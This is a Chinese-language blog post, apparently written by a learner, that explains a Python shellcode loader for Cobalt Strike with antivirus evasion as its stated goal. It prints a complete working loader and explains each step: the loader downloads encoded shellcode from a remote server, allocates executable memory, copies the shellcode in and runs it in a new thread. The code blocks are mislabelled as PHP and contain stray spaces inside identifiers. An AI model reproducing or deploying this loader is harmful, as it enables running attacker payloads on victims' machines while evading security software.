CS免杀-py加载器原理
============

最近在学习cs免杀，由于比较菜只懂python语言，就先了解py是如何实现加载shellcode写入内存的。

shellcode是一段用于利用软件漏洞而执行的代码，shellcode loader是用来运行此代码的加载器

shellcode比作子弹的话，loader就是把枪，两者缺一不可

&gt;枪和子弹在一起才有威胁性肯定不让过安检啊  
&gt;当只有loader这边枪时，没子弹构不成威胁，所以可能会绕过免杀  
&gt;当只有shellcode时，只有子弹没有枪，也可能会绕过免杀

上面就是分离免杀的大致原理,将loader上传到主机，用loader加载shellcode

shellcode
=========

我们在用cs生成payload时，会生成一段特定编程语言的代码（以python为例）

shellcode实际上是一段操作代码，计算机实现特定恶意功能的机器码转换成16进制

里面一长串\\xfc样式的16进制代码，这就是子弹shellcode

但光有子弹不行，所以我们需要一把枪loader才能让他发挥作用。

loader加载器
=========

这里找了一个网上的py加载器

```php
import ctypes
import requests
import b ase64

scode = requests.get(&quot;http://192.168.1.1/123.txt&quot;)
shellcode = bytearray(b ase64.b64decode(scode.text).decode('hex'))

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))

handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_uint64(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleO bject(
                                        ctypes.c_int(handle),
                                        ctypes.c_int(-1))                                     
```

ctypes库
-------

python的ctypes模块是内建，用来调用系统动态链接库函数的模块

使用ctypes库可以很方便地调用C语言的动态链接库，并可以向其传递参数。

```php
import ctypes
import requests
import b ase64
```

读取shellcode
-----------

我是将shellcode生成后，经hex转码，使用b ase64编码，放在了服务器123.txt文件上  
由于后面操作是将代码写入内存，所以需要将代码解码并转为字节类型

```php
scode = requests.get(&quot;http://192.168.1.1/123.txt&quot;)
shellcode = bytearray(b ase64.b64decode(scode.text).decode('hex'))
```

设置返回类型
------

我们需要用VirtualAlloc函数来申请内存，返回类型必须和系统位数相同

想在64位系统上运行，必须使用restype函数设置VirtualAlloc返回类型为ctypes.c\_unit64，否则默认的是 32 位

```php
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
```

申请内存
----

调用VirtualAlloc函数，来申请一块动态内存区域。

VirtualAlloc函数原型和参数如下

```php
LPVOID VirtualAlloc{
LPVOID lpAddress,       #要分配的内存区域的地址
DWORD dwSize,           #分配的大小
DWORD flAllocationType, #分配的类型
DWORD flProtect         #该内存的初始保护属性
};
```

申请一块内存可读可写可执行

```php
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
```

| ctypes.c\_int(0) | 是NULL，系统将会决定分配内存区域的位置，并且按64KB向上取整 |
|---|---|
| ctypes.c\_int(len(shellcode)) | 以字节为单位分配或者保留多大区域 |
| ctypes.c\_int(0x3000) | 是 MEM\_COMMIT(0x1000) 和 MEM\_RESERVE(0x2000)类型的合并 |
| ctypes.c\_int(0x40) | 是权限为PAGE\_EXECUTE\_READWRITE 该区域可以执行代码，应用程序可以读写该区域。 |

具体参考百度百科：<https://baike.baidu.com/item/VirtualAlloc/1606859?fr=aladdin>

将shellcode载入内存
--------------

调用RtlMoveMemory函数，此函数从指定内存中复制内容至另一内存里

RtlMoveMemory函数原型和参数如下

```php
RtlMoveMemory(Destination,Source,Length);
Destination ：指向移动目的地址的指针。
Source ：指向要复制的内存地址的指针。
Length ：指定要复制的字节数。
```

从指定内存地址将内容复制到我们申请的内存中去，shellcode字节多大就复制多大

```php
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))
```

创建进程
----

CreateThread将在主线程的基础上创建一个新线程

CreateThread函数原型和参数如下

```php
HANDLE CreateThread(
LPSECURITY_ATTRIBUTES lpThreadAttributes,#线程安全属性
SIZE_T dwStackSize,                     #置初始栈的大小，以字节为单位
LPTHREAD_START_ROUTINE lpStartAddress,  #指向线程函数的指针
LPVOID lpParameter,                     #向线程函数传递的参数
DWORD dwCreationFlags,                  #线程创建属性
LPDWORD lpThreadId                      #保存新线程的id
)
```

创建一个线程从shellcode放置位置开始执行

```php
handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_uint64(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))
```

| lpThreadAttributes | 为NULL使用默认安全性 |
|---|---|
| dwStackSize | 为0，默认将使用与调用该函数的线程相同的栈空间大小 |
| lpStartAddress | 为ctypes.c\_uint64(ptr)，定位到申请的内存所在的位置 |
| lpParameter | 不需传递参数时为NULL |
| dwCreationFlags | 属性为0，表示创建后立即激活 |
| lpThreadId | 为ctypes.pointer(ctypes.c\_int(0))不想返回线程ID,设置值为NULL |

具体参考百度百科：<https://baike.baidu.com/item/CreateThread/8222652?fr=aladdin>

等待线程结束
------

WaitForSingleO bject函数用来检测线程的状态

WaitForSingleO bject函数原型和参数如下

```php
DWORD WINAPI WaitForSingleO bject(
__in HANDLE hHandle,    #对象句柄。可以指定一系列的对象
__in DWORD dwMilliseconds   #定时时间间隔
);
```

等待创建的线程运行结束

```php
ctypes.windll.kernel32.WaitForSingleO bject(
                    ctypes.c_int(handle),
                    ctypes.c_int(-1)
                    )
```

这里两个参数，一个是创建的线程，一个是等待时间，

当线程退出时会给出一个信号，函数收到后会结束程序。

当时间设置为0或超过等待时间，程序也会结束，所以线程也会跟着结束。

正常的话我们创建的线程是需要一直运行的，所以将时间设为负数，等待时间将成为无限等待，程序就不会结束。

<https://baike.baidu.com/item/WaitForSingleO> bject/3534838?fr=aladdin

总结
==

上面loader大致原理就是申请一块内存，将代码字节存入该内存，然后开始运行该内存储存的程序，并让该程序一直运行下去。

本人比较菜，有啥理解错误，请大佬告知。

至于免杀等后续文章，介绍几种免杀的思路。